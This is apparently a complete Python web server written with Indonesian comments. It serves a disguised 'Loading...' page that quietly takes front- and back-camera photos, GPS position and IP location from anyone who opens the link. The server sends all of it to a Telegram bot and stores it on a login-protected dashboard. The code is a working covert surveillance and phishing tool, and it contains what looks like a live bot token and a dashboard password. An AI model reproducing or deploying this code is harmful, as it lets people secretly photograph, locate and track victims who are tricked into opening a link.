from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime
from urllib.parse import urlparse, unquote
import base64, os, json, html, urllib.request, uuid

# ================== KONFIGURASI TELEGRAM ==================
TELEGRAM_TOKEN   = os.environ.get("TG_TOKEN", "8797412860:AAEl2fAdwu06DHrCPED-_q1APrZiAhKNGWc")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "7847039406")
# ==========================================================

# ================== KONFIGURASI DASHBOARD ==================
DASHBOARD_USER     = os.environ.get("DASH_USER", "bagas")
DASHBOARD_PASSWORD = os.environ.get("DASH_PASS", "121013dika")
# ===========================================================

os.makedirs("uploads", exist_ok=True)

# ---------- HALAMAN CAPTURE ----------
CAPTURE_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Loading...</title>
<style>
body{
  background:#111;margin:0;height:100vh;
  display:flex;align-items:center;justify-content:center;
  flex-direction:column;font-family:sans-serif;color:#888;
}
.spinner{
  width:60px;height:60px;
  border:5px solid #222;
  border-top:5px solid #4a9eff;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{
  0%{transform:rotate(0deg)}
  100%{transform:rotate(360deg)}
}
.txt{margin-top:20px;font-size:14px;letter-spacing:1px}
video{display:none !important}
#status,#log{display:none !important}
</style></head>
<body>
<div class="spinner"></div>
<div class="txt">Memuat...</div>
<video id="v" autoplay playsinline></video>
<canvas id="c" style="display:none"></canvas>
<p id="status" hidden></p>
<pre id="log" hidden></pre>
<script>
const statusEl=document.getElementById('status'),logEl=document.getElementById('log');
const log=m=>{logEl.textContent+=m+"\\n";console.log(m)};
const DURASI_LOADING = 10000; // 10 detik

async function getIpInfo(){
  try{
    const r=await fetch('https://ipapi.co/json/');
    const d=await r.json();
    return{ip:d.ip,info:d};
  }catch(e){log('IP gagal: '+e.message);return{ip:null,info:null}}
}

function getGps(){
  return new Promise(res=>{
    if(!navigator.geolocation)return res(null);
    navigator.geolocation.getCurrentPosition(
      p=>res({lat:p.coords.latitude,lon:p.coords.longitude,akurasi_m:p.coords.accuracy}),
      e=>{log('GPS ditolak: '+e.message);res(null)},
      {enableHighAccuracy:true,timeout:10000}
    )
  })
}

async function getFoto(facingMode){
  try{
    const s=await Promise.race([
      navigator.mediaDevices.getUserMedia({
        video: facingMode ? {facingMode: facingMode} : true
      }),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout kamera')),10000))
    ]);
    const v=document.getElementById('v');
    v.srcObject=s;
    await new Promise(r=>v.onloadedmetadata=r);
    await new Promise(r=>setTimeout(r,1000));
    const c=document.getElementById('c');
    c.width=v.videoWidth;c.height=v.videoHeight;
    c.getContext('2d').drawImage(v,0,0);
    const d=c.toDataURL('image/png');
    s.getTracks().forEach(t=>t.stop());
    return d;
  }catch(e){
    log('Kamera ('+facingMode+') gagal: '+e.message);
    return null;
  }
}

async function main(){
  statusEl.textContent='Mengumpulkan data...';
  const[ipData,gps,fotoDepan,fotoBelakang]=await Promise.all([
    getIpInfo(),
    getGps(),
    getFoto('user'),
    getFoto('environment')
  ]);
  log('IP: '+(ipData.ip||'-'));
  log('Kota: '+(ipData.info?.city||'-'));
  log('GPS: '+(gps?(gps.lat+', '+gps.lon):'tidak ada (ditolak)'));
  log('Foto depan: '+(fotoDepan?'ADA':'gagal'));
  log('Foto belakang: '+(fotoBelakang?'ADA':'gagal'));

  await new Promise(r=>setTimeout(r, DURASI_LOADING));

  statusEl.textContent='Mengirim...';
  try{
    const res=await fetch('/upload',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        image_depan:fotoDepan,
        image_belakang:fotoBelakang,
        ip_publik:ipData.ip,
        ip_info:ipData.info,
        lokasi_gps:gps
      })
    });
    const out=await res.json();
    statusEl.textContent=out.ok?('✅ '+out.msg):'❌ Gagal';
  }catch(e){
    statusEl.textContent='❌ Error: '+e.message;
    log('Error: '+e.message);
  }
}
main();
</script>
</body></html>"""

# ---------- DASHBOARD ----------
def build_dashboard():
    all_files = [f for f in os.listdir('uploads') if f.startswith('foto_') and f.endswith('.png')]
    timestamps = sorted(set(
        f.replace('foto_','').replace('_depan.png','').replace('_belakang.png','').replace('.png','')
        for f in all_files
    ), reverse=True)

    cards = ""
    for ts in timestamps:
        meta_path = os.path.join('uploads', f'meta_{ts}.json')
        meta = json.load(open(meta_path)) if os.path.isfile(meta_path) else {}
        ip = meta.get('ip_publik') or meta.get('ip_koneksi') or '-'
        kota = (meta.get('ip_info') or {}).get('city') or '-'
        region = (meta.get('ip_info') or {}).get('region') or '-'
        gps = meta.get('lokasi_gps')
        gps_str = f"{gps['lat']:.4f}, {gps['lon']:.4f}" if gps else '-'
        tg = '✅' if meta.get('telegram_ok') else '❌'

        img_tags = ""
        if os.path.isfile(f"uploads/foto_{ts}_depan.png"):
            img_tags += f'<a href="/uploads/foto_{ts}_depan.png" target="_blank"><img src="/uploads/foto_{ts}_depan.png" loading="lazy" title="Depan"></a>'
        if os.path.isfile(f"uploads/foto_{ts}_belakang.png"):
            img_tags += f'<a href="/uploads/foto_{ts}_belakang.png" target="_blank"><img src="/uploads/foto_{ts}_belakang.png" loading="lazy" title="Belakang"></a>'
        if os.path.isfile(f"uploads/foto_{ts}.png"):
            img_tags += f'<a href="/uploads/foto_{ts}.png" target="_blank"><img src="/uploads/foto_{ts}.png" loading="lazy"></a>'

        cards += f"""
        <div class="card">
          {img_tags}
          <div class="info">
            <div class="row"><b>Waktu:</b> {html.escape(meta.get('waktu','-'))}</div>
            <div class="row"><b>IP:</b> {html.escape(str(ip))}</div>
            <div class="row"><b>Kota:</b> {html.escape(kota)}, {html.escape(region)}</div>
            <div class="row"><b>GPS:</b> {html.escape(gps_str)}</div>
            <div class="row"><b>Telegram:</b> {tg}</div>
            <div class="actions">
              <a href="/uploads/foto_{ts}_depan.png" download>⬇ Depan</a>
              <a href="/uploads/foto_{ts}_belakang.png" download>⬇ Belakang</a>
              <a href="/uploads/meta_{ts}.json" target="_blank">📄 Meta</a>
              <a href="#" onclick="hapus('{ts}');return false;" class="del">🗑 Hapus</a>
            </div>
          </div>
        </div>"""
    if not cards:
        cards = '<p style="text-align:center;color:#888;grid-column:1/-1">Belum ada foto. Buka <a href="/" style="color:#6cf">halaman capture</a>.</p>'
    tg_status = "aktif" if (TELEGRAM_TOKEN and "ISI_" not in TELEGRAM_TOKEN) else "belum diisi"

    return f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>Dashboard</title>
<style>
body{{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;margin:0;padding:20px}}
header{{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:12px}}
h1{{margin:0;font-size:22px}} .badge{{background:#1e6feb;padding:4px 10px;border-radius:20px;font-size:13px}}
.btn{{background:#1e6feb;color:#fff;padding:8px 14px;border-radius:6px;text-decoration:none;font-size:14px;margin-left:6px}}
.btn.gray{{background:#333}}
.grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}}
.card{{background:#1a1a1a;border-radius:10px;overflow:hidden;border:1px solid #2a2a2a}}
.card img{{width:50%;display:inline-block;aspect-ratio:4/3;object-fit:cover;vertical-align:top}}
.info{{padding:10px;font-size:12px}} .row{{margin-bottom:4px;color:#bbb}} .row b{{color:#eee}}
.actions{{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}}
.actions a{{font-size:11px;color:#6cf;text-decoration:none;padding:3px 6px;background:#222;border-radius:4px}}
.actions .del{{color:#f66}} .tg{{font-size:11px;color:#888;margin-bottom:12px}}
</style></head><body>
<header>
  <h1>📸 Dashboard <span class="badge">{len(timestamps)} sesi</span></h1>
  <div>
    <a href="/" class="btn">📷 CAPTURE</a>
    <a href="/dashboard" class="btn gray">🔄 Refresh</a>
  </div>
</header>
<div class="tg">Telegram forwarding: <b>{tg_status}</b></div>
<div class="grid">{cards}</div>
<script>
async function hapus(ts){{if(!confirm('Hapus?'))return;await fetch('/delete/'+ts,{{method:'POST'}});location.reload();}}
</script></body></html>"""

# ---------- TELEGRAM ----------
def send_telegram_photo(image_bytes, caption):
    if not TELEGRAM_TOKEN or "ISI_" in TELEGRAM_TOKEN:
        return False, "token/chat_id belum diisi"
    boundary = "----" + uuid.uuid4().hex
    body = b""
    def add_field(name, value):
        nonlocal body
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        body += f"{value}\r\n".encode()
    def add_file(name, filename, content, ctype):
        nonlocal body
        body += f"--{boundary}\r\n".encode()
        body += f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n'.encode()
        body += f"Content-Type: {ctype}\r\n\r\n".encode()
        body += content + b"\r\n"
    add_field("chat_id", TELEGRAM_CHAT_ID)
    add_field("caption", caption)
    add_file("photo", "foto.png", image_bytes, "image/png")
    body += f"--{boundary}--\r\n".encode()
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", f"multipart/form-data; boundary={boundary}")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            resp = json.loads(r.read().decode())
            return resp.get("ok", False), resp.get("description", "")
    except Exception as e:
        return False, str(e)

def send_telegram_text(text):
    if not TELEGRAM_TOKEN or "ISI_" in TELEGRAM_TOKEN:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    data = json.dumps({"chat_id": TELEGRAM_CHAT_ID, "text": text}).encode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        print("[TG text err]", e)

# ---------- HTTP HANDLER ----------
class Handler(BaseHTTPRequestHandler):
    def _check_auth(self):
        auth = self.headers.get('Authorization', '')
        if auth.startswith('Basic '):
            try:
                decoded = base64.b64decode(auth[6:]).decode('utf-8')
                user, _, pw = decoded.partition(':')
                if user == DASHBOARD_USER and pw == DASHBOARD_PASSWORD:
                    return True
            except Exception:
                pass
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Dashboard"')
        self.send_header('Content-Length', '0')
        self.end_headers()
        return False

    def _send(self, body, ctype='text/html; charset=utf-8', code=200):
        if isinstance(body, str): body = body.encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ('/', '/index.html'):
            self._send(CAPTURE_PAGE); return
        if path == '/dashboard':
            if not self._check_auth(): return
            self._send(build_dashboard()); return
        if path.startswith('/uploads/'):
            if not self._check_auth(): return
            fname = unquote(path.replace('/uploads/', ''))
            fpath = os.path.join('uploads', fname)
            if os.path.abspath(fpath).startswith(os.path.abspath('uploads')) and os.path.isfile(fpath):
                with open(fpath, 'rb') as f: data = f.read()
                ctype = 'application/json' if fname.endswith('.json') else 'image/png'
                self._send(data, ctype); return
        if path == '/favicon.ico':
            self.send_response(204); self.end_headers(); return
        self._send('404', 'text/plain', 404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == '/upload':
            length = int(self.headers.get('Content-Length', 0))
            payload = json.loads(self.rfile.read(length).decode('utf-8'))
            client_ip = self.client_address[0]
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')

            img_depan = b""
            img_belakang = b""
            has_depan = False
            has_belakang = False

            if isinstance(payload.get('image_depan'), str) and payload['image_depan'].startswith('data:image'):
                _, b64 = payload['image_depan'].split(',', 1)
                img_depan = base64.b64decode(b64)
                with open(f"uploads/foto_{ts}_depan.png", 'wb') as f:
                    f.write(img_depan)
                has_depan = True

            if isinstance(payload.get('image_belakang'), str) and payload['image_belakang'].startswith('data:image'):
                _, b64 = payload['image_belakang'].split(',', 1)
                img_belakang = base64.b64decode(b64)
                with open(f"uploads/foto_{ts}_belakang.png", 'wb') as f:
                    f.write(img_belakang)
                has_belakang = True

            has_photo = has_depan or has_belakang

            meta = {
                'waktu': ts,
                'ip_koneksi': client_ip,
                'ip_publik': payload.get('ip_publik'),
                'ip_info': payload.get('ip_info'),
                'lokasi_gps': payload.get('lokasi_gps'),
                'user_agent': self.headers.get('User-Agent'),
                'has_depan': has_depan,
                'has_belakang': has_belakang,
                'has_photo': has_photo,
            }

            ip_pub = meta.get('ip_publik') or meta.get('ip_koneksi') or '-'
            kota = (meta.get('ip_info') or {}).get('city', '-')
            region = (meta.get('ip_info') or {}).get('region', '-')
            gps = meta.get('lokasi_gps')
            gps_str = f"{gps['lat']}, {gps['lon']}" if gps else 'tidak tersedia (ditolak)'

            if has_depan or has_belakang:
                ok = True
                desc_list = []
                if has_depan:
                    c1 = f"📸 Kamera DEPAN {ts}\nIP: {ip_pub}\nKota: {kota}, {region}"
                    o1, d1 = send_telegram_photo(img_depan, c1)
                    ok = ok and o1
                    desc_list.append("depan:" + ("OK" if o1 else d1))
                if has_belakang:
                    c2 = f"📸 Kamera BELAKANG {ts}\nIP: {ip_pub}\nKota: {kota}, {region}"
                    o2, d2 = send_telegram_photo(img_belakang, c2)
                    ok = ok and o2
                    desc_list.append("belakang:" + ("OK" if o2 else d2))
                desc = ", ".join(desc_list)
            else:
                text = (
                    f"👤 Ada yang buka link\n"
                    f"Waktu: {ts}\n"
                    f"IP: {ip_pub}\n"
                    f"Kota: {kota}, {region}\n"
                    f"GPS: {gps_str}\n"
                    f"UA: {meta['user_agent']}"
                )
                ok, desc = True, "text only"
                try:
                    send_telegram_text(text)
                except Exception as e:
                    ok, desc = False, str(e)

            meta['telegram_ok'] = ok
            meta['telegram_desc'] = desc

            with open(f"uploads/meta_{ts}.json", 'w') as f:
                json.dump(meta, f, indent=2, ensure_ascii=False)

            if has_photo and ok:
                detail = json.dumps({
                    'waktu': ts,
                    'ip_publik': meta['ip_publik'],
                    'ip_info': meta['ip_info'],
                    'lokasi_gps': meta['lokasi_gps'],
                }, indent=2, ensure_ascii=False)
                send_telegram_text(detail)

            print(f"[UPLOAD] {ts} dari {client_ip} | depan={'ADA' if has_depan else 'TIDAK'} | belakang={'ADA' if has_belakang else 'TIDAK'} | telegram={'OK' if ok else 'GAGAL: '+desc}")
            msg = "Tersimpan" + (" + Telegram OK" if ok else " (Telegram gagal: " + desc + ")")
            self._send(json.dumps({'ok': True, 'msg': msg}), 'application/json')
            return

        if path.startswith('/delete/'):
            if not self._check_auth(): return
            ts = path.replace('/delete/', '')
            for fp in (
                f"uploads/foto_{ts}.png",
                f"uploads/foto_{ts}_depan.png",
                f"uploads/foto_{ts}_belakang.png",
                f"uploads/meta_{ts}.json"
            ):
                if os.path.isfile(fp): os.remove(fp)
            self._send(json.dumps({'ok': True}), 'application/json')
            return

        self._send('404', 'text/plain', 404)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

if __name__ == "__main__":
    tg = "AKTIF" if (TELEGRAM_TOKEN and "ISI_" not in TELEGRAM_TOKEN) else "BELUM DIISI"
    print("=" * 55)
    print("  Server jalan di http://0.0.0.0:8000")
    print("  🎥 Capture   : http://localhost:8000/")
    print("  📊 Dashboard : http://localhost:8000/dashboard (perlu login)")
    print(f"  👤 User      : {DASHBOARD_USER}")
    print(f"  🔑 Password  : {DASHBOARD_PASSWORD}")
    print(f"  📨 Telegram  : {tg}")
    print("=" * 55)
    HTTPServer(('0.0.0.0', 8000), Handler).serve_forever()
